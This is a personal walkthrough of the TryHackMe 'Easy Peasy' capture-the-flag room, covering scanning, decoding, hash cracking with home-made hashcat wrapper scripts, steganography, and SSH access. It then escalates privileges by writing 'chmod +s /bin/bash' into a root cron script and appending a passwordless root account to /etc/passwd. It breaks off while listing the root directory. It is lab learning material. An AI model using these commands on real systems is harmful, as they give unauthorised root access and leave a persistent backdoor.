---
title: easyPeasy
tags:
  - fetus
---
- room link: https://tryhackme.com/room/easypeasyctf
## nmap results:
- `nmap -p- -sCV -T4 -oN Dscan.txt 10.10.49.244`:
```sh
# Nmap 7.95 scan initiated Tue Jun  3 09:40:58 2025 as: /usr/lib/nmap/nmap -p- -sCV -T4 -oN Dscan.txt 10.10.49.244
Warning: 10.10.49.244 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.49.244
Host is up (0.18s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx 1.16.1
|_http-server-header: nginx/1.16.1
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Welcome to nginx!
6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 30:4a:2b:22:ac:d9:56:09:f2:da:12:20:57:f4:6c:d4 (RSA)
|   256 bf:86:c9:c7:b7:ef:8c:8b:b9:94:ae:01:88:c0:85:4d (ECDSA)
|_  256 a1:72:ef:6c:81:29:13:ef:5a:6c:24:03:4c:fe:3d:0b (ED25519)
65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))
|_http-title: Apache2 Debian Default Page: It works
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.43 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jun  3 09:56:55 2025 -- 1 IP address (1 host up) scanned in 956.69 seconds
```
- `nmap -T4 -A -p- -oN Ascan.txt 10.10.49.244`:
```sh
# Nmap 7.95 scan initiated Tue Jun  3 09:41:31 2025 as: /usr/lib/nmap/nmap -T4 -A -p- -oN Ascan.txt 10.10.49.244
Warning: 10.10.49.244 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.49.244
Host is up (0.17s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx 1.16.1
|_http-server-header: nginx/1.16.1
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Welcome to nginx!
6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 30:4a:2b:22:ac:d9:56:09:f2:da:12:20:57:f4:6c:d4 (RSA)
|   256 bf:86:c9:c7:b7:ef:8c:8b:b9:94:ae:01:88:c0:85:4d (ECDSA)
|_  256 a1:72:ef:6c:81:29:13:ef:5a:6c:24:03:4c:fe:3d:0b (ED25519)
65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))
|_http-server-header: Apache/2.4.43 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Apache2 Debian Default Page: It works
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   185.09 ms 10.21.0.1
2   185.20 ms 10.10.49.244

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jun  3 09:58:08 2025 -- 1 IP address (1 host up) scanned in 997.43 seconds
```
- answered all the nmap questions from these results 
- tryhackme gave a custom wordlist. lets do some http enumeration: 
## http enum ([[nginx]]):
- nginx default page. nothing on the source and nothing on robots.txt that i can see 
- time to do some directory busting using [[gobuster]]. havent used it in ages. 
- nothing showed up after i used the given wordlist. fuck it ill use `common.txt` from seclist and use good ol [[feroxbuster]] 
- yup got some stuff:
```sh
200      GET       25l       69w      612c http://10.10.121.210/
301      GET        7l       11w      169c http://10.10.121.210/hidden => http://10.10.121.210/hidden/
200      GET       25l       69w      612c http://10.10.121.210/index.html
200      GET        3l        5w       43c http://10.10.121.210/robots.txt
200      GET       18l       32w      390c http://10.10.121.210/hidden/index.html
301      GET        7l       11w      169c http://10.10.121.210/hidden/whatever => http://10.10.121.210/hidden/whatever/
200      GET       21l       35w      435c http://10.10.121.210/hidden/whatever/index.html
```
- lets see where they lead:
- ooh `/hidden/` tittle says `Welcome to ctf!`. hosts an image from pixabay as the background image and nothing else on the source either: <br>
![[T1-16.5-easyPeasyHiddenSS.png]]
- `/hidden/whatever/` hosts another image from pixabay, says its a deadend in the title and seems like nothing else. checked the source and found this: <br>
![[T1-16.5-easyPeasyHiddenWhateverSS.png]]
- seems like base64:
```sh
ZmxhZ3tmMXJzN19mbDRnfQ==
```
- lets try to crack it
```sh
echo "ZmxhZ3tmMXJzN19mbDRnfQ==" | base64 -d
```
- gives us:
```sh
flag{f1rs7_fl4g}# 
```
- nice the first flag :D
- thm says to enumerate the machine further to get the next flag. ok then. doesnt seem like ill find anything else on nginx. time to move on to apache 
## http enum ([[apache]])
- the default apache page at root 
- `robots.txt` has some weird shit in it:
```txt
User-Agent:*
Disallow:/
Robots Not Allowed
User-Agent:a18672860d0510e5ab6699730763b250
Allow:/
This Flag Can Enter But Only This Flag No More Exceptions
```
- the jumbled mess in the user agent is apparently an MD5 hash. lets try to crack it with [[hashcat]] and the given wordlist i suppose?
- the given wordlist couldnt crack it. lets try rockyou
- damn even rockyou couldnt crack it :0 lets check online databases
- `hashes.com` immediately gave the answer :DD <br>
![[T1-16.5-easyPeasyHashesdotcomSuccessSS.png]]
- lets try dirbusting now 
- `common.txt` gave me nothing new. gonna try with `big.txt`
- nothing's showing up. maybe i missed something? i didnt check the source for apache lets check that out
- yup exactly what i missed. got this on the source:
```html
<div class="page_header floating_element">
        <img src="/icons/openlogo-75.png" alt="Debian Logo" class="floating_element"/>
        <span class="floating_element">
          Apache 2 It Works For Me
	<p hidden>its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu</p>
        </span>
      </div>
```
- says its encoded but not with what. ba something, must be a base
```sh
ObsJmP173N2X6dOrAgEAL0Vu
```
- well its not base64 thats clear. gonna mess around with other bases in cyberchef
- its base62. gives us a directory seems like:
```http
/n0th1ng3ls3m4tt3r
```
- lets see whats in there. oh and the directory busting isnt gonna show anything seeems like. gonna stop that. 
- ooh very haxxor lmao xD <br>
![[T1-16.5-easyPeasyNothingelsematterSS.png]]
- lets see the source. if that fails ill check the image for steganography
- the image is from pixabay again. there is a hash in the source tho seems like. lets crack it
```sh
940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81
```
- its apparently SHA-256. gonna try with [[hashcat]] and the given wordlist again 
```sh
hashcat -m 1400 hash2 easypeasy_1596838725703.txt
```
- failed again. even with rockyou. what even is the wordlist for then - __ - 
- huh good question. whats the wordlist for. are there any flags in it? lemme grepncheck real quick
- yup theres a flag just sitting there lmao
```sh
flag{9fdafbd64c47471a8f54cd3fc64cd312}
```
- yuup that was flag 3
- moving on. asks for the hidden directory on tryhackme. i already found it. gonna submit the nothing else matter thingy (it should be matterS not matter. the missing S bothers me so much :"D)
- anything else going on with easy peasy?
```sh
╭─[~/projects/easyPeasy]─[root@DEMONDAYZ]─[0]─[1573]
╰─[:)] # wc -l easypeasy_1596838725703.txt 
5140 easypeasy_1596838725703.txt
╭─[~/projects/easyPeasy]─[root@DEMONDAYZ]─[0]─[1574]
╰─[:)] # sort -u easypeasy_1596838725703.txt| wc -l
4147
```
- huh theres duplicate lines. lemme cut that shit down real quick 
- saved the new unique one as `ezpz.dic`
```sh
sort -u easypeasy_1596838725703.txt > ezpz.dic
```
- tryhackme says to crack it with the given wordlist. i already tried SHA-256. lets try the others like:
	- Haval-256
	- GOST R 34.11-94
	- Possible Hashs:
	- RipeMD-256
	- SNEFRU-256
	- SHA-256(HMAC)
	- Haval-256(HMAC)
	- RipeMD-256(HMAC)
	- SNEFRU-256(HMAC)
	- SHA-256(md5($pass))
	- SHA-256(sha1($pass))
- damn seems like a pain. can i not automate this?
- shitGPT gave me a script. lets run it:
```python
#!/usr/bin/env python3
import subprocess
import sys
import os

# ------------- CONFIGURATION -------------
# Double‐check these mode numbers on your local `hashcat --help`.
MODES = {
    "Haval-256": "121",
    "GOST_R_34_11_94": "6100",
    "RIPEMD-256": "9100",
    "SNEFRU-256": "9000",
    "SHA256-HMAC": "1451",
    "HAVAL-256-HMAC": "125",
    "RIPEMD-256-HMAC": "9101",
    "SNEFRU-256-HMAC": "9001",
    "SHA256_md5": "1410",
    "SHA256_sha1": "1430",
}
# ------------- END CONFIGURATION -------------

if len(sys.argv) != 3:
    print(f"Usage: {sys.argv[0]} <hash_file> <wordlist>")
    sys.exit(1)

hash_file = sys.argv[1]
wordlist = sys.argv[2]

# Validate the hash file
if not os.path.isfile(hash_file) or os.path.getsize(hash_file) == 0:
    print(f"Error: Hash file '{hash_file}' does not exist or is empty.")
    sys.exit(1)

def try_crack(algo_name, mode, hash_file, wordlist):
    # Hashcat takes the hash file directly—no need to write temp.
    proc = subprocess.run(
        ["hashcat", "-m", mode, "-a", "0", "--quiet", hash_file, wordlist],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    if proc.returncode == 0:
        # Found a match, extract with --show
        show_proc = subprocess.run(
            ["hashcat", "-m", mode, "-a", "0", "--quiet", "--show", hash_file, wordlist],
            capture_output=True,
            text=True
        )
        line = show_proc.stdout.strip().split(":")
        cleartext = line[1] if len(line) >= 2 else "(parse error)"
        print(f"[FOUND] {algo_name} → '{cleartext}'")
    else:
        print(f"[NOT FOUND] {algo_name}")

print(f"Starting automated checks on hash file: {hash_file}")
print(f"Wordlist: {wordlist}\n")

for algo_name, mode in MODES.items():
    print(f"→ Testing {algo_name:<20} (mode {mode})… ", end="", flush=True)
    try_crack(algo_name, mode, hash_file, wordlist)

print("\nAll attempts finished.")
```
- didnt give us anything. maybe we didnt use the right modes. lemme modify the script so it takes in actual possible hash modes after running `hashcat --show hashfile` and then does it with those. will make it a reusable script for me in the future as well
- V2:
```python fold title:autoCrackV2.py
#!/usr/bin/env python3
import subprocess
import sys
import os
import re

def validate_args():
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <hash_file> <wordlist>")
        sys.exit(1)

    hash_file = sys.argv[1]
    wordlist  = sys.argv[2]

    if not os.path.isfile(hash_file) or os.path.getsize(hash_file) == 0:
        print(f"Error: Hash file '{hash_file}' does not exist or is empty.")
        sys.exit(1)

    if not os.path.isfile(wordlist) or os.path.getsize(wordlist) == 0:
        print(f"Error: Wordlist '{wordlist}' does not exist or is empty.")
        sys.exit(1)

    return hash_file, wordlist

def get_candidate_modes(hash_file):
    """
    Runs: hashcat --show <hash_file>
    Parses its stdout to extract lines like:
       1400 | SHA2-256   | Raw Hash
       17400 | SHA3-256 | Raw Hash
    Returns a list of (mode_id, mode_name) tuples.
    """
    proc = subprocess.run(
        ["hashcat", "--show", hash_file],
        capture_output=True,
        text=True
    )
    output = proc.stdout.splitlines()
    candidate_modes = []
    pattern = re.compile(r'^\s*(\d+)\s*\|\s*(.+?)\s*\|\s*(.+)$')

    for line in output:
        match = pattern.match(line)
        if match:
            mode_id   = match.group(1).strip()
            mode_name = match.group(2).strip()
            candidate_modes.append((mode_id, mode_name))

    return candidate_modes

def run_hashcat_crack(mode, hash_file, wordlist):
    """
    Run: hashcat -m <mode> -a 0 --quiet <hash_file> <wordlist>
    Return True if exit_code == 0 (i.e., cracked at least one hash), else False.
    """
    proc = subprocess.run(
        ["hashcat", "-m", mode, "-a", "0", "--quiet", hash_file, wordlist],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    return (proc.returncode == 0)

def extract_cracked_pairs(mode, hash_file, wordlist):
    """
    After a successful crack attempt, call:
      hashcat -m <mode> -a 0 --quiet --show <hash_file> <wordlist>
    Parse its stdout to return a list of (hash, cleartext) tuples.
    """
    show_proc = subprocess.run(
        ["hashcat", "-m", mode, "-a", "0", "--quiet", "--show", hash_file, wordlist],
        capture_output=True,
        text=True
    )
    lines = show_proc.stdout.strip().splitlines()
    results = []
    for line in lines:
        if ":" in line:
            h, clear = line.split(":", 1)
            results.append((h, clear))
    return results

def main():
    hash_file, wordlist = validate_args()

    print(f"→ Enumerating possible modes with `hashcat --show {hash_file}` …")
    candidates = get_candidate_modes(hash_file)

    if not candidates:
        print("No candidate modes found. Either your hash_file is invalid or Hashcat's output format changed.")
        sys.exit(1)

    print(f"→ Found {len(candidates)} candidate mode(s):")
    for mode_id, mode_name in candidates:
        print(f"   • {mode_id} ({mode_name})")

    cracked_summary = []  # list of (mode_id, mode_name, [(hash, clear), ...])

    print("\n→ Starting crack attempts on each candidate mode …\n")

    for mode_id, mode_name in candidates:
        print(f"→ Trying mode {mode_id:<6} ({mode_name}) … ", end="", flush=True)
        did_crack = run_hashcat_crack(mode_id, hash_file, wordlist)

        if did_crack:
            # Immediately extract and print cracked pairs for this mode:
            pairs = extract_cracked_pairs(mode_id, hash_file, wordlist)
            print("[FOUND]")
            for h, clear in pairs:
                print(f"    {h} → '{clear}'")

            # Add to the summary list and continue to next mode
            cracked_summary.append((mode_id, mode_name, pairs))
        else:
            print("[NOT FOUND]")

    print("\n=== Summary of Successful Modes ===")
    if not cracked_summary:
        print("No modes cracked any hashes. Double-check your wordlist and/or hash format.")
        sys.exit(0)

    for mode_id, mode_name, pairs in cracked_summary:
        print(f"\n→ Mode {mode_id} ({mode_name}) cracked {len(pairs)} hash(es):")
        for h, clear in pairs:
            print(f"    {h} → '{clear}'")

    print("\nAll done. :)")
    sys.exit(0)

if __name__ == "__main__":
    main()
    
```
- output after running `python autoCrack.py hash2 ezpz.dic`: (potfile carryover ruins it - _ -)
```sh
→ Enumerating possible modes with `hashcat --show hash2` …
→ Found 8 candidate mode(s):
   • 1400 (SHA2-256)
   • 17400 (SHA3-256)
   • 11700 (GOST R 34.11-2012 (Streebog) 256-bit, big-endian)
   • 6900 (GOST R 34.11-94)
   • 17800 (Keccak-256)
   • 1470 (sha256(utf16le($pass)))
   • 20800 (sha256(md5($pass)))
   • 21400 (sha256(sha256_bin($pass)))

→ Starting crack attempts on each candidate mode …

→ Trying mode 1400   (SHA2-256) … [FOUND]
    940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81 → 'mypasswordforthatjob'
→ Trying mode 17400  (SHA3-256) … [FOUND]
    940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81 → 'mypasswordforthatjob'
→ Trying mode 11700  (GOST R 34.11-2012 (Streebog) 256-bit, big-endian) … [FOUND]
    940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81 → 'mypasswordforthatjob'
→ Trying mode 6900   (GOST R 34.11-94) … [FOUND]
    940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81 → 'mypasswordforthatjob'
→ Trying mode 17800  (Keccak-256) … [FOUND]
    940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81 → 'mypasswordforthatjob'
→ Trying mode 1470   (sha256(utf16le($pass))) … [FOUND]
    940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81 → 'mypasswordforthatjob'
→ Trying mode 20800  (sha256(md5($pass))) … [FOUND]
    940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81 → 'mypasswordforthatjob'
→ Trying mode 21400  (sha256(sha256_bin($pass))) … [FOUND]
    940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81 → 'mypasswordforthatjob'

=== Summary of Successful Modes ===

→ Mode 1400 (SHA2-256) cracked 1 hash(es):
    940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81 → 'mypasswordforthatjob'

→ Mode 17400 (SHA3-256) cracked 1 hash(es):
    940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81 → 'mypasswordforthatjob'

→ Mode 11700 (GOST R 34.11-2012 (Streebog) 256-bit, big-endian) cracked 1 hash(es):
    940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81 → 'mypasswordforthatjob'

→ Mode 6900 (GOST R 34.11-94) cracked 1 hash(es):
    940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81 → 'mypasswordforthatjob'

→ Mode 17800 (Keccak-256) cracked 1 hash(es):
    940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81 → 'mypasswordforthatjob'

→ Mode 1470 (sha256(utf16le($pass))) cracked 1 hash(es):
    940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81 → 'mypasswordforthatjob'

→ Mode 20800 (sha256(md5($pass))) cracked 1 hash(es):
    940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81 → 'mypasswordforthatjob'

→ Mode 21400 (sha256(sha256_bin($pass))) cracked 1 hash(es):
    940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81 → 'mypasswordforthatjob'

All done. :)
```
- well its not the actual output but what i get after actually cracking it with a less feature rich version of the script so you get the idea
- gonna modify the script so that it keeps track of what mode actually cracks it so it gives the correct information back and removes the potfile carryover. will probably add more features to this script as we go along
- v3:
```python
#!/usr/bin/env python3
"""
auto_crack_isolated.py

Usage:
  auto_crack_isolated.py <hash_file> <wordlist>

What it does:
  • Maintains per-<hash,mode_id> tracking in crack_log.json to avoid redundant cracking.
  • Reads all valid hashes from <hash_file> (ignores empty lines and comments).
  • Uses `hashcat --show <hash_file>` to enumerate structurally compatible hash modes.
  • For each candidate mode:
     – Filters out hashes already attempted with this mode (via log).
     – Writes remaining hashes to a temporary subset file.
     – Creates a mode-specific temp potfile and runs Hashcat with:
           hashcat -m <mode> -a 0 --quiet --potfile-path <pot> <subset_file> <wordlist>
     – If exit code == 0, reruns Hashcat with `--show` to get cracked results.
         • Prints “[FOUND]” and the <hash> → '<clear>' for each.
         • Logs each cracked result with mode, cleartext, and UTC timestamp.
     – If nothing was cracked, prints “[NOT FOUND]”.
     – Cleans up temporary potfile and subset file after each mode.
  • At the end, prints a summary of all newly cracked hashes per mode.

Example:
  ./auto_crack_isolated.py hashes.txt rockyou.txt
"""

import subprocess
import sys
import os
import re
import tempfile
import json
from datetime import datetime, timezone

LOG_FILE = "crack_log.json"

def validate_args():
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <hash_file> <wordlist>")
        sys.exit(1)

    hash_file = sys.argv[1]
    wordlist  = sys.argv[2]

    if not os.path.isfile(hash_file) or os.path.getsize(hash_file) == 0:
        print(f"Error: Hash file '{hash_file}' does not exist or is empty.")
        sys.exit(1)

    if not os.path.isfile(wordlist) or os.path.getsize(wordlist) == 0:
        print(f"Error: Wordlist '{wordlist}' does not exist or is empty.")
        sys.exit(1)

    return hash_file, wordlist

def load_log_entries():
    """
    Load existing log entries from crack_log.json, each entry is
    { "hash": ..., "mode_id": ..., "clear": ..., "timestamp": ... }.
    Returns a set of (hash, mode_id) tuples, and the full list for appending.
    """
    if os.path.isfile(LOG_FILE):
        try:
            with open(LOG_FILE, "r") as f:
                data = json.load(f)
                seen = {(entry["hash"], entry["mode_id"]) for entry in data}
                return seen, data
        except Exception:
            pass
    return set(), []

def append_log(entries_list, entry):
    """
    Append a single entry dict to entries_list and write out to LOG_FILE.
    """
    entries_list.append(entry)
    with open(LOG_FILE, "w") as f:
        json.dump(entries_list, f, indent=2)

def get_all_hashes(hash_file):
    """
    Read all non-empty, non-comment lines from hash_file.
    """
    hashes = []
    with open(hash_file, "r") as f:
        for line in f:
            h = line.strip()
            if h and not h.startswith("#"):
                hashes.append(h)
    return hashes

def get_candidate_modes(hash_file):
    """
    Runs: hashcat --show <hash_file>
    Parses its stdout to extract lines like:
       1400 | SHA2-256   | Raw Hash
       17400 | SHA3-256  | Raw Hash
       …
    Returns a list of (mode_id, mode_name) tuples.
    """
    try:
        proc = subprocess.run(
            ["hashcat", "--show", hash_file],
            capture_output=True,
            text=True
        )
    except FileNotFoundError:
        print("Error: `hashcat` not found in PATH.")
        sys.exit(1)

    output = proc.stdout.splitlines()
    candidate_modes = []
    pattern = re.compile(r'^\s*(\d+)\s*\|\s*(.+?)\s*\|\s*(.+)$')

    for line in output:
        match = pattern.match(line)
        if match:
            mode_id   = match.group(1).strip()
            mode_name = match.group(2).strip()
            candidate_modes.append((mode_id, mode_name))

    return candidate_modes

def run_hashcat_with_pot(mode, subset_file, wordlist, potpath):
    """
    Runs: hashcat -m <mode> -a 0 --quiet --potfile-path <potpath> <subset_file> <wordlist>
    Returns True if exit-code == 0 (i.e. cracked ≥1 hash), else False.
    """
    proc = subprocess.run(
        ["hashcat", "-m", mode, "-a", "0", "--quiet",
         "--potfile-path", potpath, subset_file, wordlist],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    return (proc.returncode == 0)

def extract_cracked_from_pot(mode, subset_file, wordlist, potpath):
    """
    After a successful run, call:
      hashcat -m <mode> -a 0 --quiet --potfile-path <potpath> --show <subset_file> <wordlist>
    Returns a list of (hash, cleartext) tuples that this mode cracked.
    """
    show_proc = subprocess.run(
        ["hashcat", "-m", mode, "-a", "0", "--quiet",
         "--potfile-path", potpath, "--show", subset_file, wordlist],
        capture_output=True,
        text=True
    )
    lines = show_proc.stdout.strip().splitlines()
    pairs = []
    for line in lines:
        if ":" in line:
            h, clear = line.split(":", 1)
            pairs.append((h, clear))
    return pairs

def main():
    hash_file, wordlist = validate_args()

    # Load existing log
    already_cracked, log_entries = load_log_entries()

    print(f"→ Enumerating possible modes with `hashcat --show {hash_file}` …")
    candidates = get_candidate_modes(hash_file)

    if not candidates:
        print("No candidate modes found. Either your hash_file is invalid or Hashcat's output format changed.")
        sys.exit(1)

    # Read all hashes once
    all_hashes = get_all_hashes(hash_file)

    print(f"→ Found {len(candidates)} candidate mode(s):")
    for mode_id, mode_name in candidates:
        print(f"   • {mode_id}  ({mode_name})")

    cracked_summary = []  # list of (mode_id, mode_name, [(hash, clear), ...])

    print("\n→ Starting isolated crack attempts, one subset per mode …\n")

    for mode_id, mode_name in candidates:
        # Build subset of pending hashes for this mode
        pending = [h for h in all_hashes if (h, mode_id) not in already_cracked]
        if not pending:
            print(f"→ Mode {mode_id:<6} ({mode_name}) … [SKIPPED] no new hashes for this mode. delete crack_log.json if you wish to still run this mode ig??")
            continue

        print(f"→ Mode {mode_id:<6} ({mode_name}) … ", end="", flush=True)

        # Write pending hashes to a temporary subset file
        tf = tempfile.NamedTemporaryFile(prefix="hc_subset_", delete=False, mode="w")
        for h in pending:
            tf.write(h + "\n")
        tf.flush()
        tf.close()
        subset_file = tf.name

        # 1) Create a unique temp potfile for this mode
        tmp_pot = tempfile.NamedTemporaryFile(prefix="hc_pot_", delete=False)
        tmp_pot_path = tmp_pot.name
        tmp_pot.close()

        # 2) Run hashcat on the subset
        cracked = run_hashcat_with_pot(mode_id, subset_file, wordlist, tmp_pot_path)

        if cracked:
            # 3) Extract exactly what this mode cracked
            pairs = extract_cracked_from_pot(mode_id, subset_file, wordlist, tmp_pot_path)
            print("[FOUND]")
            for h, clear in pairs:
                print(f"    {h} → '{clear}'")
                # Log each newly cracked <hash, mode_id, clear, timestamp>
                entry = {
                    "hash": h,
                    "mode_id": mode_id,
                    "clear": clear,
                    "timestamp": datetime.now(timezone.utc).isoformat()
                }
                append_log(log_entries, entry)
                cracked_summary.append((mode_id, mode_name, pairs))
        else:
            print("[NOT FOUND]")

        # 4) Cleanup
        try:
            os.remove(tmp_pot_path)
        except OSError:
            pass
        try:
            os.remove(subset_file)
        except OSError:
            pass

    # Final summary
    print("\n=== Summary of All Modes That Actually Cracked Something ===")
    if not cracked_summary:
        print("No modes cracked any new hashes. Check your wordlist and/or hash file.")
        sys.exit(0)

    for mode_id, mode_name, pairs in cracked_summary:
        # Note: pairs may repeat across modes, but we only log newly cracked ones above.
        print(f"\n→ Mode {mode_id} ({mode_name}) cracked {len(pairs)} hash(es):")
        for h, clear in pairs:
            print(f"    {h} → '{clear}'")

    print("\nAll done :D")
    sys.exit(0)

if __name__ == "__main__":
    main()

```
- output:
```sh
→ Enumerating possible modes with `hashcat --show hash2` …
→ Found 8 candidate mode(s):
   • 1400  (SHA2-256)
   • 17400  (SHA3-256)
   • 11700  (GOST R 34.11-2012 (Streebog) 256-bit, big-endian)
   • 6900  (GOST R 34.11-94)
   • 17800  (Keccak-256)
   • 1470  (sha256(utf16le($pass)))
   • 20800  (sha256(md5($pass)))
   • 21400  (sha256(sha256_bin($pass)))

→ Starting isolated crack attempts, one subset per mode …

→ Mode 1400   (SHA2-256) … [NOT FOUND]
→ Mode 17400  (SHA3-256) … [NOT FOUND]
→ Mode 11700  (GOST R 34.11-2012 (Streebog) 256-bit, big-endian) … [NOT FOUND]
→ Mode 6900   (GOST R 34.11-94) … [FOUND]
    940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81 → 'mypasswordforthatjob'
→ Mode 17800  (Keccak-256) … [NOT FOUND]
→ Mode 1470   (sha256(utf16le($pass))) … [NOT FOUND]
→ Mode 20800  (sha256(md5($pass))) … [NOT FOUND]
→ Mode 21400  (sha256(sha256_bin($pass))) … [NOT FOUND]

=== Summary of All Modes That Actually Cracked Something ===

→ Mode 6900 (GOST R 34.11-94) cracked 1 hash(es):
    940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81 → 'mypasswordforthatjob'

All done. :)
```
- keeps a log in `crack_log.json`:
```json
[
  {
    "hash": "940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81",
    "mode_id": "6900",
    "clear": "mypasswordforthatjob",
    "timestamp": "2025-06-03T20:31:23.208076+00:00"
  }
]#
```
- damn what a useful thing i got now xD gonna upload it to github later. oh right i was solving the room fuck. i totally forgot its 2 am now i wasted 2 hours on this :"D lets solve the room real quick shall we
- password:
```
mypasswordforthatjob
```
- yup tryhackme slurped that up. onto the next answer. asks for the ssh password. gonna keep [[hydra]] bruteforcing ssh with rockyou while i do further enumeration
- what did i miss? the images. lets check em out
- got 3 images:
	- `lost-places-1928727_960_720.jpg`
	- `norway-772991_960_720.jpg` and
	- `matrix-3109795_960_720.jpg`
- ah im too tired to check all these manually against exiftool, binwalk, steghide and other stuff. gonna look for something that automates this 
- hell yeah https://www.aperisolve.com/ does exactly that
- damn none of them showed anything wtf. did i miss anything?
- oh bruh theres another local image - __ - lets wget that 
- nothing in the metadata or binwalk output. lets check [[steghide]] 
```sh
steghide --info binarycodepixabay.jpg
```
- output:
```sh
"binarycodepixabay.jpg":
  format: jpeg
  capacity: 4.6 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "secrettext.txt":
    size: 278.0 Byte
    encrypted: no
    compressed: no
```
- lets get `secrettext.txt`:
```txt
username:boring
password:
01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
```
- oh for fucks sake more encoding??????? this is getting exausting <br>
![[FB_IMG_1730734016986.jpg]]
- fine lets go to cyberchef againnnnn
```sh
iconvertedmypasswordtobinary
```
- asshole - __ -
- okay got the password. whats the username D: 
- oh right i have a custom wordlist totally forgor lmao. lets use [[hydra]] to brute force that shii
- nvm im fucking sleep deprived the username is literally given right there in `secrettext.txt` <br>
![[FB_IMG_1736784447184.jpg]]
```sh
boring:iconvertedmypasswordtobinary
```
- im in: <br>
![[T1-16.5-easyPeasyImInSS.png]]
- `user.txt`:
```txt
synt{a0jvgf33zfa0ez4y}
```
- the flag is rotated? probably ROT13. lemme get that shit. 
- yup ROT13 
```
flag{n0wits33msn0rm4l}
```
- finally time to run linpeas
- something unusual in the cron jobs section: <br>
![[T1-16.5-easyPeasyCronSusSS.png]]
- lets find `.mysecretcronjob.sh` 
```sh
boring@kral4-PC:/tmp$ find / -name ".mysecretcronjob.sh" 2>/dev/null
/var/www/.mysecretcronjob.sh
```
- its in `/var/www/`
- lets see what its doing
```sh
boring@kral4-PC:/tmp$ cat /var/www/.mysecretcronjob.sh
#!/bin/bash
# i will run as root
```
- huh well thats ez root if we got edit perms. lets check perms 
```sh
boring@kral4-PC:/tmp$ ls -la /var/www/.mysecretcronjob.sh
-rwxr-xr-x 1 boring boring 33 Jun 14  2020 /var/www/.mysecretcronjob.sh
```
- yuup lets get root then
- added an SUID bit to `/bin/bash`:
```sh
boring@kral4-PC:/tmp$ cat /var/www/.mysecretcronjob.sh
#!/bin/bash
# i will run as root
chmod +s /bin/bash
boring@kral4-PC:/tmp$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1113504 Jun  6  2019 /bin/bash
```
- lmao lets get ez root now
```sh
boring@kral4-PC:/tmp$ /bin/bash -ip
bash-4.4# id
uid=1000(boring) gid=1000(boring) euid=0(root) egid=0(root) groups=0(root),1000(boring)
```
- partial root. lets get fullroot with [[partialRootToFullRootChecklist]] i made a few days ago xD
```sh
bash-4.4# python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
bash-4.4# id
uid=0(root) gid=1000(boring) groups=1000(boring)
bash-4.4# echo 'haxor::0:0::/root:/bin/bash' >> /etc/passwd
bash-4.4# su haxor
root@kral4-PC:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```
- yaayyyy full root. that checklist is coming in so handy now xD lets get the root flag and be done with this 
```sh
root@kral4-PC:~# ls -la
total 40
drwx------  5 root root 4096 Jun 15  2020 .
drwxr-xr-x 23 root root 4096 Jun 15  2020 ..
